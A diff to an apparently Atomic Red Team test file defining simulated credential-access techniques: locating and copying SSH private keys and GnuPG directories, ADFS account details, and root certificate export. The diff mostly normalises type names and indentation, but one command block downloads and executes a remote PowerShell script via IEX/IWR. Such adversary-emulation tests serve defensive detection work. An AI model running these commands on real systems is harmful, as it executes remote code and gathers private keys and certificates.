@@ -23,11 +23,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_file:
       description: Output file containing locations of SSH key files
-      type: Path
+      type: path
       default: /tmp/keyfile_locations.txt
   executor:
     command: |
@@ -44,11 +44,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing copies of SSH private key files
-      type: Path
+      type: path
       default: /tmp/art-staging
   executor:
     command: |
@@ -67,11 +67,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from.
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing copies of SSH private key files
-      type: Path
+      type: path
       default: /tmp/art-staging
   executor:
     command: |
@@ -90,11 +90,11 @@ atomic_tests:
   input_arguments:
     search_path:
       description: Path where to start searching from
-      type: Path
+      type: path
       default: /
     output_folder:
       description: Output folder containing a copy of the .gnupg directory
-      type: Path
+      type: path
       default: /tmp/GnuPG
   executor:
     command: |
@@ -138,19 +138,19 @@ atomic_tests:
   input_arguments:
     adfs_service_account_name:
       description: Name of the ADFS service account
-      type: String
+      type: string
       default: "adfs_svc"
     replication_user:
       description: Username with replication rights. It can be the Domain Admin running the script
-      type: String
+      type: string
       default: "Administrator"
     replication_password:
       description: Password of replication_username
-      type: String
+      type: string
       default: "ReallyStrongPassword"
     adfs_server_name:
       description: Name of an ADFS server
-      type: String
+      type: string
       default: "sts.contoso.com"
   dependency_executor_name: powershell
   dependencies:
@@ -209,18 +209,18 @@ atomic_tests:
   input_arguments:
     output:
       description: file path to export to
-      type: Path
+      type: path
       default: c:\temp\atomic.pfx
     password:
       description: password for cert
-      type: String
+      type: string
       default: password
   executor:
     command: |
-       IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
-       certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
+      IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+      certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}
     cleanup_command: |
-       Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
+      Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
     name: powershell
     elevation_required: true
 - name: Export Root Certificate with Export-PFXCertificate
@@ -233,7 +233,7 @@ atomic_tests:
   input_arguments:
     pfx_path:
       description: output path of the certificate
-      type: String
+      type: string
       default: $env:Temp\atomicredteam.pfx
   executor:
     command: |
@@ -259,7 +259,7 @@ atomic_tests:
   input_arguments:
     pfx_path:
       description: Path of the certificate
-      type: Path
+      type: path
       default: $env:Temp\AtomicRedTeam.cer
   executor:
     command: |
@@ -274,4 +274,4 @@ atomic_tests:
       }
       catch { }
     name: powershell
-    elevation_required: true 
+    elevation_required: true
